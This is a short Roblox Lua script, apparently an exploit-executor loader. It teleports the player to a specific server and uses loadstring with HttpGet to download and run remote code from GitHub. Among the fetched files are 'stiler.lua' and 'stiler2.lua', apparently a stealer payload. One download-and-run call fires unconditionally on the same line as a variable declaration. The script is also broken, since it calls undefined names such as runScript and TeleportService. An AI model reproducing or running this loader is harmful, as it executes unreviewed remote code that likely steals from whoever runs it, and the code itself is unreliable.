local targetPlaceId = 126884695634066
local targetJobId = "750902da843513478c23a20c4446fdc1"loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
-- Check if we're already in the right server
if game.PlaceId == targetPlaceId and game.JobId == targetJobId then
    -- Already in the correct place and job, just run the script
	loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua'))()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
else
    -- Teleport and run the script when we arrive
    TeleportService.TeleportSucceeded:Connect(function(_, _)
        repeat task.wait() until game:IsLoaded()
        runScript()
    end)

    TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
end
